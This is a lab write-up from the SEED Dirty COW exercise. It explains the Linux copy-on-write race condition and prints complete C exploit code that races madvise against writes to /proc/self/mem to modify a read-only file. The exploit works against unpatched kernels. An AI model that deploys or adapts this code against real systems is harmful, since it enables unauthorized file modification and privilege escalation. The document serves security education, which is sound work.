# Dirty-COW Attack Lab

## Lab link: https://seedsecuritylabs.org/Labs_20.04/Software/Dirty_COW/

## Exploiting Dirty COW

The following code first maps a read-only file to memory using MAP_PRIVATE, then it creates two threads, one doing an infinite loop of `madvise(map, file_size, MADV_DONTNEED);`, the other one opening the pseudo-file of the current process's memory and busy-trying to write to it. 

How the exploit works?

Linux has the Copy-On-Write mechanism. So it will only try to copy the page when the `writeThread` tries to actually override the memory address. 

But the crucial observation is:

> `write` is not atomic!

When we call `write()`, because of COW, actually there are three steps involved:

- Copy the page to another page in memory
- Change Page Table in the process
- Do the actual write

And this write thread can be switched to another thread at any point. Consider the case that it got switched out to the `madviseThread` after finishing first two steps and before entering step 3,  `madviseThread` becomes active and `madvise` will tell the kernel to discard our private mapping of the read-only file, and starts wrting to the original file. As a result, we successfully write to a read-only file!

Here is a nice demo: https://www.cs.toronto.edu/~arnold/427/18s/427_18S/indepth/dirty-cow/demo.html

```c
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <string.h>

void *map;
void *writeThread(void *arg);
void *madviseThread(void *arg);

int main(int argc, char *argv[])
{
  pthread_t pth1,pth2;
  struct stat st;
  int file_size;

  // Open the target file in the read-only mode.
  int f=open("/zzz", O_RDONLY);

  // Map the file to COW memory using MAP_PRIVATE.
  fstat(f, &st);
  file_size = st.st_size;
  map=mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);

  // Find the position of the target area
  char *position = strstr(map, "222222");                        

  // We have to do the attack using two threads.
  pthread_create(&pth1, NULL, madviseThread, (void  *)file_size); 
  pthread_create(&pth2, NULL, writeThread, position);             

  // Wait for the threads to finish.
  pthread_join(pth1, NULL);
  pthread_join(pth2, NULL);
  return 0;
}

void *writeThread(void *arg)
{
  char *content= "******";
  off_t offset = (off_t) arg;

  int f=open("/proc/self/mem", O_RDWR);
  while(1) {
    // Move the file pointer to the corresponding position.
    lseek(f, offset, SEEK_SET);
    // Write to the memory.
    write(f, content, strlen(content));
  }
}

void *madviseThread(void *arg)
{
  int file_size = (int) arg;
  while(1){
      madvise(map, file_size, MADV_DONTNEED);
  }
}



```
